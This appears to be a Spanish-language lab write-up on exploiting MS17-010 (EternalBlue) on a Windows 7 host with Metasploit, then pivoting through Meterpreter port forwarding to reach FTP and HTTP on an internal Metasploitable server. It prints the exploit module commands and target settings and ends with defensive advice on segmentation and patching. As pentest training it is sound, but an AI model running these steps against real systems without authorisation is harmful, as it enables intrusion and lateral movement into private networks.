Pivoting y explotación controlada de EternalBlue

Laboratorio técnico orientado a comprender un escenario de post-explotación y movimiento a través de redes internas utilizando una máquina Windows 7 vulnerable a MS17-010 como punto de pivote hacia un segundo segmento.

🐧 Kali Linux 🪟 Windows 7 x64 ☠ MS17-010 ↪ Pivoting ⚙ Metasploit 🛡 Authorized Lab
⚠ Uso controlado: las técnicas descritas deben utilizarse únicamente en laboratorios, CTFs, infraestructuras propias o sistemas sobre los que exista autorización explícita para realizar pruebas de seguridad.

📘 Introducción

En este laboratorio se analiza el concepto de pivoting y su aplicación dentro de un escenario controlado de pentesting.

El objetivo inicial corresponde a un sistema Windows 7 x64 vulnerable a MS17-010 / EternalBlue. Una vez obtenida una sesión sobre dicho host, se identificará una segunda interfaz de red conectada a un segmento interno que no es directamente accesible desde el sistema de pruebas.

Utilizando el host comprometido como punto de pivote, se configurará el enrutamiento dentro de Metasploit para realizar reconocimiento sobre la red interna y validar la conectividad con un segundo objetivo representado por un servidor Metasploitable.

[ PIVOTING ] Técnica de post-explotación mediante la cual un sistema comprometido se utiliza como punto intermedio para acceder o enrutar tráfico hacia redes que originalmente no son alcanzables desde la máquina de auditoría.

El host dispone de dos interfaces de red. La primera mantiene conectividad con el sistema Kali Linux, mientras que la segunda proporciona acceso al segmento interno 10.10.10.0/24.

☠ Validación controlada de EternalBlue

Una vez completado el proceso previo de reconocimiento, enumeración y análisis del host Windows 7, se procede a validar la exposición a MS17-010 mediante Metasploit.

Iniciar Metasploit Framework

kali@pentest · metasploit 
┌──(root㉿kali)-[~]
└─# msfconsole
[ METASPLOIT ] Inicialización del framework

Buscar módulos asociados a MS17-010

metasploit · search 
msf6 > search ms17
[ SEARCH ] Módulos disponibles para MS17-010

Seleccionar módulo EternalBlue

metasploit · ms17-010 
msf6 > use exploit/windows/smb/ms17_010_eternalblue

msf6 exploit(ms17_010_eternalblue) > show options
[ MODULE ] Opciones del exploit MS17-010 EternalBlue

Configurar el objetivo

metasploit · target configuration 
msf6 exploit(ms17_010_eternalblue) > set rhosts 192.168.1.40

msf6 exploit(ms17_010_eternalblue) > show options
[ TARGET ] Configuración de RHOSTS

Ejecutar la validación

metasploit · exploit 
msf6 exploit(ms17_010_eternalblue) > exploit

🔀 Port Forwarding

Para acceder desde Kali Linux a servicios disponibles únicamente dentro del segmento interno, se utiliza port forwarding a través de la sesión Meterpreter.

Esta técnica establece una redirección entre un puerto local del sistema de auditoría y un servicio remoto accesible únicamente mediante el host pivote.

ADD Añade una nueva regla de forwarding.
DELETE Elimina una regla específica.
LIST Lista las reglas configuradas.
FLUSH Elimina las reglas existentes.
[ PORTFWD ] Configuración de forwarding

En el primer caso se redirige el servicio FTP del servidor interno hacia el puerto local 2121.

[ FTP ] Acceso mediante localhost:2121

Posteriormente se configura una nueva redirección para acceder al servicio HTTP disponible en el puerto 80 del segundo objetivo.

[ PORTFWD ] Redirección del servicio HTTP
[ HTTP ] Acceso al servicio interno mediante forwarding
[ STATUS ] Validación de la regla de forwarding

[ FINAL ] Sesiones obtenidas dentro del laboratorio

🛡 Conclusión técnica

El laboratorio demuestra de forma práctica cómo una vulnerabilidad en un sistema conectado a múltiples segmentos de red puede convertirse en un punto de entrada para realizar movimiento lateral y pivoting hacia infraestructura interna.

Después de establecer una sesión sobre Windows 7 mediante EternalBlue, se identificaron las interfaces adicionales del host, se configuró el enrutamiento dentro de Metasploit y se realizó reconocimiento sobre el segmento 10.10.10.0/24.

Finalmente, mediante port forwarding fue posible acceder a servicios del servidor Metasploitable desde el sistema Kali Linux y completar la validación del segundo objetivo.

Security Note: la segmentación de red, el parcheo de sistemas, la eliminación de protocolos obsoletos, el control de rutas entre segmentos y la monitorización del tráfico lateral son controles fundamentales para reducir el impacto de este tipo de escenarios.
